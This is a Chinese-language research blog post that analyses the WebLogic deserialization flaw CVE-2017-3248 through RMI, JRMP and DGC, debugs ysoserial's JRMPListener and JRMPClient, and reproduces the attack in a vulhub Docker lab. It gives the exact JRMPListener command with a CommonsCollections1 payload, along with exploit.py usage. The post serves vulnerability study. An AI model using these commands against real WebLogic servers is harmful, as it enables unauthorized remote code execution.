> 原文链接: https://www.anquanke.com//post/id/225137 


# CVE-2017-3248——WebLogic反序列化初探


                                阅读量   
                                **158995**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)



## 一、原理

### <a class="reference-link" name="%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E8%BF%B0"></a>（一）概述

前面我们提到， CVE-2015-4852往后有一系列漏洞都是立足于对其补丁的绕过的，CVE-2017-3248也是其中之一。

WebLogic 使用这种黑名单的方式试图过滤掉危险的类的这种修复方式有一定的效果，但也存在被绕过的风险。根据学习，我了解到的绕过的思路有如下几种：一是找到可用且未在黑名单之内的新类（新类要能构造链实现任意代码执行），此时的payload为新的；二是找到一种类，这种类可以反序列化自身成员变量，此时可以封装旧的payload；三是找到未在黑名单之内的新反序列化点，此时可以发旧的payload。CVE-2016-3510和CVE-2016-0638主要是基于第二种思路， CVE-2017-3248 则是基于第三种思路，通过JRMP 协议达到执行任意反序列化 payload。

如果CVE-2015-4852是这个系列的开篇，后面的漏洞都是它的后续的话，CVE-2017-3248则可以说是基于CVE-2015-4852的绕过，并开启了一个新系列。2017年之后的漏洞多有通过构造JRMP服务器监听进行反向触发的特点。举个不恰当的例子，神探狄仁杰一的第一章“使团惊魂”开启了神探狄仁杰整个系列，神探狄仁杰二的第一章“关河疑影”则是基于“使团惊魂”的后续剧情开启了新的篇章。<br>
说句题外话，结合对调用栈的分析，个人感觉，这一系列漏洞的利用点随着时间顺序正在逐渐用到底层协议方面的内容。

### <a class="reference-link" name="%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-3248"></a>（二）CVE-2017-3248

先讲下需要的知识：

**<a class="reference-link" name="1%E3%80%81RMI"></a>1、RMI**

远程方法调用(Remote Method Invocation)。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。

[![](https://p4.ssl.qhimg.com/t01e3b833f9a94863d7.png)](https://p4.ssl.qhimg.com/t01e3b833f9a94863d7.png)

宏观上看，RMI远程调用步骤：

1）客户对象调用客户端辅助对象上的方法；

2）客户端辅助对象打包调用信息（变量，方法名），通过网络发送给服务端辅助对象；

3）服务端辅助对象将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象；

4）调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象；

5）服务端辅助对象将结果打包，发送给客户端辅助对象；

6）客户端辅助对象将返回值解包，返回给客户对象；

7）客户对象获得返回值；

[![](https://p0.ssl.qhimg.com/t011916f5c9bbb5963c.png)](https://p0.ssl.qhimg.com/t011916f5c9bbb5963c.png)

详细来看，对于Client来说，他甚至可以不知道有Server的存在，所有他需要的只是一个stub，对于Client来说，调用远程方法就是调用Stub的方法，

从我们一个局外人的角度上看，数据是在Client和Server之间是横向流动的，但是微观上看整个流程必有网络层面的大量的纵向流动，一个请求先从Client发出，交给Stub，走过Transport Layer之后交由Skeleton，最后到Server，Server调用相应方法，然后将结果原路返回，流程如下：

1.Server监听一个端口，此端口由JVM随机选择（这一点在ysoserial中可见）；

2.Client对于Server上的远程对象的位置信息（通信地址和端口）一无所知，只知道向stub发起请求，而stub中包含了这些信息，并封装了底层网络操作；

3.Client调用Stub上对应的方法；

4.Stub连接到Server监听的通信端口并提交方法的参数；

5.Server上执行具体的方法，并将结果原路返回给Stub；

对于Client来说，远程调用的执行结果是Stub给它的，从Client看来就好像是Stub在本地执行了这个方法一样。

这一部分的原理有很多大佬讲的很清楚了，不再赘述，只提一点：stub可以先从RMIRegister中获取到Server中对象的信息，进而对其进行调用。在网络上，调用所需的参数（client给RMIregister、RMIRegister给Server）和调用的结果（Server给RMIregister、RMIregister给Client）是以序列化字节流的格式传输的，也就为攻击提供了可能。

RMI依赖于ip与端口，且依赖于Java远程消息交换协议JRMP（Java Remote Messaging Protocol），该协议为java定制，要求服务端与客户端都为java编写。

<a class="reference-link" name="2%E3%80%81JRMP"></a>**2、JRMP**

Java远程消息交换协议（Java Remote MessagingProtocol），是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。作为一个Java特有的、适用于Java之间远程调用的基于流的协议，要求客户端和服务器上都使用Java对象。

### <a class="reference-link" name="%EF%BC%88%E4%B8%89%EF%BC%89%E5%8E%9F%E7%90%86"></a>（三）原理

<a class="reference-link" name="1.%E5%8E%9F%E7%90%86"></a>**1.原理**

结合我的调试过程与自己的理解谈谈我对原理的粗浅的认识。

整个过程涉及到的内容跟之前相比已经比较偏底层了，涉及到RMI和DGC的机制，RMI的一些过程在调试过程中会有显现，我想简单讲下和DGC有关的部分，之前没有遇到过。

具体来讲，这里利用RMI，让victim反序列化UnicastRef这个类，使该类发起一个JRMP连接到恶意服务端上，从而在DGC层造成一个反序列化，因为DGC层的filter是在反序列化之后进行设置的，所以之前设置的黑名单过滤没有作用，

正常情况下，DGC server通过实现引用计数接口来实现内存管理，当DGC client调用一个远程对象（增加一个引用计数）时，需要调用DGC server的dirty()函数，然后dirty()返回给client一个lease(DGCClient.vmid, DGCClient.leaseValue)；Client需要不断调用dirty()函数来更新其对相应对象的引用的expire；当Client不再需要这个对象时，需要调用DGC server的clean()函数。

对于DGC server来说，其关键部分是dirty()和clean()，对于DGC Client来说，关键函数是registerRefs()，这又和RMI的内容有关，对于这个漏洞我们只需要知道RMI调用的对象需要register即可，不必过多研究。

[![](https://p1.ssl.qhimg.com/t011f3460810f1b591a.png)](https://p1.ssl.qhimg.com/t011f3460810f1b591a.png)

我们知道，攻击过程涉及三方，attacker（这里所指的攻击方仅发送payload使victim向JRMP Server或者叫JRMP Listener发起请求）、JRMP Server（或者叫JRMP Listener）和victim，attacker使用payload攻击victim，victim通过RMI向DGC server（此处为JRMP Server）发起dirty()请求，但这里返回的不再是一个常规的lease，而是构造好的数据（甚至和前面的几个CVE相比没有什么差别），victim收到后，进行反序列化，从而触发RCE。

这一系列漏洞同宗同源，都可以看做是一条链的变种，都可以绕过所谓的黑名单，感觉颇有点像黑名单只卡住了整条链上的一个点，所以换个其他的切入点就能绕过。

[![](https://p1.ssl.qhimg.com/t01d2f3b75625fdfd13.png)](https://p1.ssl.qhimg.com/t01d2f3b75625fdfd13.png)

<a class="reference-link" name="2.%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86"></a>**2.工具原理**

这里可以分两部分，一是JRMP Server的部分，二是attacker的部分，分别对应着ysoserial中的 JRMPListener和JRMPClient。

<a class="reference-link" name="%EF%BC%881%EF%BC%89JRMPListener"></a>**（1）JRMPListener**

这里遇到了一个离谱的事情，就是在IDEA里只有用JDK8才能成功编译ysoserial，平常跑ysoserial.jar的JDK7会有错。

配置如下，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0119f4e1ad37b927af.png)

先看一下main的源码，

[![](https://p4.ssl.qhimg.com/t01425b77fe5bab0990.png)](https://p4.ssl.qhimg.com/t01425b77fe5bab0990.png)

下面结合调试看一下具体的流程，

先跟进makePayloadObject，

[![](https://p2.ssl.qhimg.com/t01daae9c82aa1aef27.png)](https://p2.ssl.qhimg.com/t01daae9c82aa1aef27.png)

[![](https://p1.ssl.qhimg.com/t0119b173a60fbdcb46.png)](https://p1.ssl.qhimg.com/t0119b173a60fbdcb46.png)

跟到return，

[![](https://p5.ssl.qhimg.com/t01cf78f29355f06afb.png)](https://p5.ssl.qhimg.com/t01cf78f29355f06afb.png)

可以看到，这里和之前CVE-2015-4852使用的payload别无二致，都是CommonsCollections1类型的AnnotationInvocationHandler。

继续跟进，

[![](https://p0.ssl.qhimg.com/t018b9a889ff763671c.png)](https://p0.ssl.qhimg.com/t018b9a889ff763671c.png)

[![](https://p3.ssl.qhimg.com/t01ade2f45c945eb449.png)](https://p3.ssl.qhimg.com/t01ade2f45c945eb449.png)

开启了本地监听，接下来的run函数会一直监听。

[![](https://p2.ssl.qhimg.com/t013db157f429196564.png)](https://p2.ssl.qhimg.com/t013db157f429196564.png)

若是接收到请求，先判断请求类型，若为DGC则会将payload返回出去。

[![](https://p1.ssl.qhimg.com/t01bf6558f6ae994245.png)](https://p1.ssl.qhimg.com/t01bf6558f6ae994245.png)

可以看到，返回的就是AnnotationInvocationHandler，

[![](https://p3.ssl.qhimg.com/t01e16713f3e5fa0e46.png)](https://p3.ssl.qhimg.com/t01e16713f3e5fa0e46.png)

这一部分的功能比较好理解，不再多做解释。

<a class="reference-link" name="%EF%BC%882%EF%BC%89JRMPClient"></a>**（2）JRMPClient**

上一部分是向发起DGC请求的RMI Registry返回一个恶意对象让其解析，这一部分即是为了使靶机能够向JRMP Listener发起DGC请求。

这一部分的功能实现在payload目录下JRMPClient里。

[![](https://p2.ssl.qhimg.com/t018d01cb27a2a5252b.png)](https://p2.ssl.qhimg.com/t018d01cb27a2a5252b.png)

这里主要就是从TCP层开始向上构造，封装这个装有UnicastRef的实例，发送victim，让它向JRMP Server发起DGC请求。



## 二、调试

### <a class="reference-link" name="%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>（一）环境搭建

在正式开始前记录在启动或停止docker中WebLogic服务时遇到的两个小问题，

[![](https://p2.ssl.qhimg.com/t013587c4137a7873e4.png)](https://p2.ssl.qhimg.com/t013587c4137a7873e4.png)

删除servers/AdminServer/tmp/AdminServer.lok即可

[![](https://p2.ssl.qhimg.com/t01f3b01a8cf9cb3276.png)](https://p2.ssl.qhimg.com/t01f3b01a8cf9cb3276.png)

解决方法不难，删除对应目录下的 embeddedldap.lok 即可。

很奇怪，之前没有遇到过类似的问题，不知是不是异常退出导致的。

此处的搭建可以直接使用vulhub的环境

```
docker-compose up -d
```

### <a class="reference-link" name="%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A4%8D%E7%8E%B0"></a>（二）复现

搭建好后，访问 ip:7001/console

然后启动一个JRMP Server:

```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 'touch /tmp/aug'
```

其中，7777是JRMP Server监听的端口，’touch /tmp/aug’即为想执行的命令，。

由于我这里是在Ubuntu上开启的docker，所以这里要在Ubuntu上启动一个JRMP Server（我怀疑这是一个坑，起初没有注意这个问题，直接在Windows上开启了一个JRMP Server，虽然docker无法ping到Windows，Windows上的JRMP Server却能收到连接，但无法复现。后来换成在Ubuntu上启动JRMP Server，则可复现成功）。

然后，使用python2运行，

[exploit.py](https://www.exploit-db.com/exploits/44553)

向目标Weblogic（ip:7001/console）发送数据包：

```
python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
```

其中，victim ip和victim port是目标weblogic的IP和端口，path to ysoserial是本地ysoserial的路径，JRMPListener ip和JRMPListener port第一步中启动JRMP Server的IP地址和端口。JRMPClient是执行JRMPClient的类，可选的值是JRMPClient（针对CVE-2017-3248）或JRMPClient2（针对CVE-2017-3248的绕过）。

最后查看相应目录，

[![](https://p1.ssl.qhimg.com/t011e9f2b42d397a9ba.png)](https://p1.ssl.qhimg.com/t011e9f2b42d397a9ba.png)

可见已成功执行命令。

### <a class="reference-link" name="%EF%BC%88%E4%B8%89%EF%BC%89%E8%B0%83%E8%AF%95"></a>（三）调试

开启JRMP Server后，以exp打之，先是正常的读入字节流进行反序列化（这里很遗憾的一点就是环境对应不到相应的补丁，看不到完全的流程），

ysoserial中，反向连接所需的host和port先存入te，而后存入了LiveRef中，接着封装进 UnicastRef 里，

[![](https://p3.ssl.qhimg.com/t013cbe29f00ea4d17b.png)](https://p3.ssl.qhimg.com/t013cbe29f00ea4d17b.png)

再封装进 RemoteObjectInvocationHandler 中，最后用 Proxy.newProxyInstance 生成了一个 proxy ，这里和之前区别不大，

[![](https://p5.ssl.qhimg.com/t01454f69520de7aa0f.png)](https://p5.ssl.qhimg.com/t01454f69520de7aa0f.png)

exp打过去，会触发RemoteObjectInvocationHandler的反序列化

[![](https://p3.ssl.qhimg.com/t0103fb412c20d5cc9f.png)](https://p3.ssl.qhimg.com/t0103fb412c20d5cc9f.png)

[![](https://p1.ssl.qhimg.com/t01575a0d1319e25640.png)](https://p1.ssl.qhimg.com/t01575a0d1319e25640.png)

RemoteObjectInvocationHandler 反序列化时，会调用其父类 RemoteObject 的 readObject()，

[![](https://p4.ssl.qhimg.com/t01e76279f062a17d14.png)](https://p4.ssl.qhimg.com/t01e76279f062a17d14.png)

因为有重写，会越过这一段，

[![](https://p2.ssl.qhimg.com/t0141f9be689e43e46f.png)](https://p2.ssl.qhimg.com/t0141f9be689e43e46f.png)

在下面调用，

[![](https://p4.ssl.qhimg.com/t01205ad4447730294c.png)](https://p4.ssl.qhimg.com/t01205ad4447730294c.png)

就开始触发。

[![](https://p1.ssl.qhimg.com/t0185fa3cf5eef427cd.png)](https://p1.ssl.qhimg.com/t0185fa3cf5eef427cd.png)

[![](https://p5.ssl.qhimg.com/t01cbda28bb341615aa.png)](https://p5.ssl.qhimg.com/t01cbda28bb341615aa.png)

这里从跟进RemoteObject的readObject向下走，

[![](https://p2.ssl.qhimg.com/t012ba8651661986620.png)](https://p2.ssl.qhimg.com/t012ba8651661986620.png)

向下，

[![](https://p5.ssl.qhimg.com/t010f0dc929d782d8b2.png)](https://p5.ssl.qhimg.com/t010f0dc929d782d8b2.png)

[![](https://p2.ssl.qhimg.com/t012f4eb3129a8e93c9.png)](https://p2.ssl.qhimg.com/t012f4eb3129a8e93c9.png)

接下来就层层剥开，

[![](https://p4.ssl.qhimg.com/t01bbf8191460aa1e3e.png)](https://p4.ssl.qhimg.com/t01bbf8191460aa1e3e.png)

[![](https://p3.ssl.qhimg.com/t01e9808b775c2f1966.png)](https://p3.ssl.qhimg.com/t01e9808b775c2f1966.png)

[![](https://p2.ssl.qhimg.com/t01cce5b275d86aece7.png)](https://p2.ssl.qhimg.com/t01cce5b275d86aece7.png)

LiveRef的read函数中会向server发起请求，注册对象，

[![](https://p5.ssl.qhimg.com/t01cbebc8dfae489d09.png)](https://p5.ssl.qhimg.com/t01cbebc8dfae489d09.png)

[![](https://p5.ssl.qhimg.com/t018eee84475be9b359.png)](https://p5.ssl.qhimg.com/t018eee84475be9b359.png)

[![](https://p4.ssl.qhimg.com/t01c9f9d329cef245e4.png)](https://p4.ssl.qhimg.com/t01c9f9d329cef245e4.png)

接下来进入DGCClient（但不知道什么原因这里有的点断不下来），

[![](https://p5.ssl.qhimg.com/t0128790016cb56a832.png)](https://p5.ssl.qhimg.com/t0128790016cb56a832.png)

这里面调用了重载的registerRefs，

[![](https://p4.ssl.qhimg.com/t0159ca31171397ce60.png)](https://p4.ssl.qhimg.com/t0159ca31171397ce60.png)

这个函数里面就有我们最终需要的makeDirtyCall，

[![](https://p1.ssl.qhimg.com/t010fb17fa14fa9c22c.png)](https://p1.ssl.qhimg.com/t010fb17fa14fa9c22c.png)

跟进，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e71e3047fd028415.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01637bd6a422b930c1.png)

接下来就是关键部分，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0169474db3d024b1e3.png)

这里的this.dgc.dirty是一个关键点，正常情况下它应该返回一个Lease，作为这个远程对象的存活时间的依据，

如下，真实的Lease，

[![](https://p3.ssl.qhimg.com/t017d29bb8671a6ce80.png)](https://p3.ssl.qhimg.com/t017d29bb8671a6ce80.png)

但是这里远程服务器是恶意的，返回的并不是一个Lease，而是一个构造好的Set，虚假的Lease，

[![](https://p4.ssl.qhimg.com/t010795f1b4f25df9a5.png)](https://p4.ssl.qhimg.com/t010795f1b4f25df9a5.png)

而这里的触发点并不在黑名单之列，故而不会受影响。

再向下跟就进入了我们熟悉的CommonsCollections1环节（这是我的一个疑惑点，为什么就进去了），

[![](https://p3.ssl.qhimg.com/t0171165e58084b805d.png)](https://p3.ssl.qhimg.com/t0171165e58084b805d.png)

接受指点和查阅资料后，意识到跟进的不够深入，于是重新调试，

[参考链接](https://xz.aliyun.com/t/2650#toc-2)

接着下面这个场景，重新调试，

[![](https://p2.ssl.qhimg.com/t014a89e414d0358380.png)](https://p2.ssl.qhimg.com/t014a89e414d0358380.png)

根据之前调用栈的情况，

[![](https://p5.ssl.qhimg.com/t01d2d116b6f27a7259.png)](https://p5.ssl.qhimg.com/t01d2d116b6f27a7259.png)

我们知道应该跟进到DGCImpl_Stub的dirty（而非普通的DGC）里（个人认为这算是调试工具的一点点不足，就是无法通过分析代码逻辑确定一个变量的最终类型，对于变量的相关信息主要还是静态分析获得的。但也不能就说这个工具不好，毕竟人也很难做到），

然而尝试了好几种方法也没能断下来，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016c51dd6ea84a8c14.png)

无奈，只好越过它跟进 UnicastRef.invoke()（这里想了点题外话，为什么不能完全依靠静态时的Ctrl+点击跟进RefRemote.invoke()，而必须要根据动态调试结合调用栈确定是 UnicastRef.invoke()。原因一是要围绕主题，整个CVE的利用都是用到的是UnicastRef而不是RefRemote；原因二是只有动态调起来才能确定程序的走向）,

[![](https://p5.ssl.qhimg.com/t01b674f9410c7c7f38.png)](https://p5.ssl.qhimg.com/t01b674f9410c7c7f38.png)

继续跟进，

[![](https://p1.ssl.qhimg.com/t01d36bae415e542485.png)](https://p1.ssl.qhimg.com/t01d36bae415e542485.png)

这里的几处判断都比较简单，进入switch，

[![](https://p0.ssl.qhimg.com/t016dd0656b07e18db1.png)](https://p0.ssl.qhimg.com/t016dd0656b07e18db1.png)

这里调用了this.in.readObject()，

查看this.in，

[![](https://p3.ssl.qhimg.com/t013ef5810356215eeb.png)](https://p3.ssl.qhimg.com/t013ef5810356215eeb.png)

可见，正是构造好的字节流，

接着正常进入了AnnotationInvocationHandler的readObject，

[![](https://p5.ssl.qhimg.com/t01ffec6c4f1cef79eb.png)](https://p5.ssl.qhimg.com/t01ffec6c4f1cef79eb.png)

此时完整的调用栈如下，

```
readObject:320, AnnotationInvocationHandler (sun.reflect.annotation)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:39, NativeMethodAccessorImpl (sun.reflect) [2]
invoke:25, DelegatingMethodAccessorImpl (sun.reflect)
invoke:597, Method (java.lang.reflect)
invokeReadObject:969, ObjectStreamClass (java.io)
readSerialData:1871, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
defaultReadFields:1969, ObjectInputStream (java.io)
readSerialData:1893, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
defaultReadFields:1969, ObjectInputStream (java.io)
defaultReadObject:478, ObjectInputStream (java.io)
readObject:313, AnnotationInvocationHandler (sun.reflect.annotation)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:39, NativeMethodAccessorImpl (sun.reflect) [1]
invoke:25, DelegatingMethodAccessorImpl (sun.reflect)
invoke:597, Method (java.lang.reflect)
invokeReadObject:969, ObjectStreamClass (java.io)
readSerialData:1871, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
defaultReadFields:1969, ObjectInputStream (java.io)
readSerialData:1893, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
readObject:349, ObjectInputStream (java.io)
executeCall:225, StreamRemoteCall (sun.rmi.transport)
invoke:359, UnicastRef (sun.rmi.server)
dirty:-1, DGCImpl_Stub (sun.rmi.transport)
makeDirtyCall:342, DGCClient$EndpointEntry (sun.rmi.transport)
access$1600:153, DGCClient$EndpointEntry (sun.rmi.transport)
run:555, DGCClient$EndpointEntry$RenewCleanThread (sun.rmi.transport)
run:662, Thread (java.lang)
```

可以看出是起于DGCClient 的makeDirtyCall及相关的成员变量，

接下来是熟悉的invoke(),

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01834bfedd37ea154d.png)

查看此时的调用栈，

[![](https://p0.ssl.qhimg.com/t01e18b687a00c8d925.png)](https://p0.ssl.qhimg.com/t01e18b687a00c8d925.png)

和CVE-2015-4852的调用栈对比来看（黄圈内为黑名单设的点，红框向上即为CommonsCollections1的链），

[![](https://p5.ssl.qhimg.com/t0121a27c0000df200b.png)](https://p5.ssl.qhimg.com/t0121a27c0000df200b.png)

从这里我们可以看出这里的反序列化是由DGC请求触发的，没有走原来的线路，所以在原来的那几个反序列化点上设置的限制条件没有任何用处。

下面都很熟悉了，稍作展示，不再赘述。

[![](https://p5.ssl.qhimg.com/t0144656771360a624b.png)](https://p5.ssl.qhimg.com/t0144656771360a624b.png)

[![](https://p0.ssl.qhimg.com/t0162f752b16a83c5ab.png)](https://p0.ssl.qhimg.com/t0162f752b16a83c5ab.png)

当这些完成后，退回到executeCall() 中，

[![](https://p4.ssl.qhimg.com/t01207e7d31d98c0197.png)](https://p4.ssl.qhimg.com/t01207e7d31d98c0197.png)

引发异常，

[![](https://p3.ssl.qhimg.com/t01db200ebca404050e.png)](https://p3.ssl.qhimg.com/t01db200ebca404050e.png)

这里便是前面看到的异常。

另外，从Ubuntu 的wireshark里抓包，查看其返回给docker的数据包的情况，

[![](https://p5.ssl.qhimg.com/t015adc568c5d900549.png)](https://p5.ssl.qhimg.com/t015adc568c5d900549.png)

载荷的一小部分，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01caaa5bb61e726d52.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b6dfd85366dfbc6b.png)

由此可见，返回给靶机docker的数据包是序列化后的CommonsCollections1的攻击链，确实与原来无异，也与上面的this.in一致。



## 三、收获与启示

调完之后，我意识到最开始的那个比喻虽然不贴合严肃的学习，却跟这几个漏洞的演进过程比较贴切。

这几个漏洞的基础都是最开始CVE-2015-4852的那条链，由于Oracle在进行防护时采用的黑名单不严谨（比如只截断一个链上的一个点），对这条链的后续利用可谓是层出不穷。

起初的学习过程中，我认为这个系列的漏洞的黑名单只是个噱头而已，作用不大。然而，在这个漏洞的调试过程中，我感受到：这个黑名单虽然没能完全达到防护的效果，但它一定程度上已经发挥了不小的防护作用。CVE-2015-4852的黑名单添加了CVE-2016-3510和CVE-2016-0638的触发点后，原来的那条链从源头上基本被切断了，很难找到合适的线路去连接CommonsCollections1的片段了，这已经是一个不小的进步了。这一现状迫使大牛们寻找新的利用链路，在2017年提出了通过构造JRMP Listener 反向触发的方法，算是又开启了一个新的系列。

在CVE-2017-3248的学习过程中，我感受到了比最开始接触CVE-2015-4852时更大的压力，之前虽然学了Java的一些基础知识，但是对于其中的很多内容理解不够到位，这个漏洞涉及到的内容偏底层，对我这样一个Java新手来说难度有些大，我通过自己写demo、深入跟踪调试的方法才慢慢能够理解其部分的内在原理，一定程度上算是走出了自己的舒适区。

另外，这里我有一点体会到了二分法解决问题的思路，这个描述不太准确，大体的意思就是先确定调试过程中的几个少量的关键点，然后以这些点分段，逐段下断仔细研究、调试。
